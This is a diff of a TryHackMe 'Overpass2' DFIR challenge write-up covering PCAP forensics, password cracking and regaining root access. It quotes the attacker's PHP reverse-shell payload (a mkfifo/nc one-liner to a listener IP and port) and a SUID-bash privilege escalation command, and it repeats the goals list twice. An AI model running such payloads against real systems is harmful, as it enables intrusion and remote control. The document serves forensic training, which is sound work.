@@ -1,19 +1,51 @@
 # Overpass2- Hacked Challenge Report
 ## Introduction
-This challenge involves analysis and investigation of a network traffic dump from a compromised network. The goal is to analyse the network traffic and identify how the attacker got into the network and check for any persistence mechanisms. After that, we have to hack our way back into the machine to get the flags. It also involves password cracking and some malware reverse engineering.
+This TryHackMe challenge is excellent for learning **Digital Forensics and Incident Response (DFIR)**. We are given a PCAP file (network traffic capture) from a compromised Linux web server.
 
-Let’s get going...
+**Our goals are:**
+- Understand how the attacker gained access
+- Find the reverse shell payload
+- Identify the privilege escalation password
+- Discover how the attacker maintained persistence (backdoor)
+- Analyse the backdoor code
+- Crack passwords
+- Get back into the machine and retrieve both user and root flags
+
+We will go through every step slowly and clearly.
+
+**Our goals are:**
+- Understand how the attacker gained access
+- Find the reverse shell payload
+- Identify the privilege escalation password
+- Discover how the attacker maintained persistence (backdoor)
+- Analyse the backdoor code
+- Crack passwords
+- Get back into the machine and retrieve both user and root flags
+
+We will go through every step slowly and clearly.
+
+---
 
 ## Walkthrough
 ## Task 1: Forensics- Analyse the PCAP
-**Question:** What was the URL of the page they used to upload a reverse shell? <br>
-**Answer:** /development/ <br>
+Open the provided PCAP file in **Wireshark**.
 
-To view uploaded data we use thefollowing filter in wireshark **http.request.method=POST** <br>
+**Question:** What was the URL of the page they used to upload a reverse shell? <br>
+**Answer:** `/development/` <br>
+
+**How to find it (Step-by-step):**
+1. In Wireshark, go to the filter bar and type:  
+   `http.request.method == POST`
+2. Apply the filter and look at the HTTP POST requests.
+3. You will see a POST request to `/development/`.
+
+This page allowed file uploads, and the attacker used it to upload a malicious PHP file containing a reverse shell.
+
 <img width="953" height="354" alt="task 1 1" src="https://github.com/user-attachments/assets/45184ebb-c109-4842-8c23-8c8ad532ed17" /> <br>
 _URL used to upload the reverse the shell_
 
-A **reverse shell** is a remote access method/script where a compromised target machine initiates an outbound network connection back to an attacker's listening machine/C2 Server. The reverse shell can help the analyst identify the attacker's C2 server which can help in blocking their IP for remote access.
+**What is a reverse shell?**  
+A reverse shell is a technique where the compromised victim machine actively connects back to the attacker’s computer. This is very common because most firewalls allow outbound connections but block inbound ones.
 
 Question: What payload did the attacker use to gain access? <br>
 Answer: **<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh-i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>** <br>
@@ -87,12 +119,12 @@ Question: Crack the hash using rockyou and a cracking tool of your choice. What'
 Answer: **november16**
 
 ## Task 3: Attack- Get back in
-Question: The attacker defaced the website. What message did they leave as a heading? <br>
-Answer: **H4ck3d by CooctusClan** <br>
+**Question:** The attacker defaced the website. What message did they leave as a heading? <br>
+**Answer:** H4ck3d by CooctusClan <br>
 <img width="1462" height="276" alt="task 3 1" src="https://github.com/user-attachments/assets/4481abd8-41cc-4e21-84c3-7290883a6dbb" /> <br>
 _Defaced website_
 
-Visiting the compromised website shows the defacement webpage with the defaced text displayed on it.
+Visiting the compromised website shows the message left by attacker/defaced.
 
 Question: Using the information you've found previously, hack your way back in! <br>
 Answer: **No answer needed.**
@@ -111,9 +143,7 @@ Answer: **thm{d53b2684f169360bb9606c333873144d}** <br>
 <img width="451" height="74" alt="task 3 4 " src="https://github.com/user-attachments/assets/8a419f40-d3aa-4073-a769-3c8d83f13316" /> <br>
 _Root flag_
 
-Further digging led to privilege escalation. Inside the original directory, checking for hidden files revealed a root-owned SUID binary called .suid_bash. By executing ./.suid_bash -p, I spawned a root shell, which unlocked the /root directory and secured the final root flag.
+Privilege escalation was achieved by locating a root-owned SUID binary named `.suid_bash` in a hidden directory. Running `./.suid_bash -p` spawned a root shell, allowing access to the `/root` flag.
 
 ## Conlusion
-Learned a couple of new things. One, analyzing malware and network for IOCs collection which can be used for defense in IDS/IPS systems. Two cracking password hashes with JohnTheRipper and hashcat.
-
-This was a good learning experience as this knowledge can be used during Digital Forensics and Incident Response.
+This challenge provided valuable hands-on experience with network forensics, reverse shell analysis, password cracking (using Hashcat), static malware analysis, and privilege escalation techniques. Key takeaways include the importance of hunting for Indicators of Compromise (IOCs) in network traffic and the practical application of digital forensics and incident response (DFIR) skills.
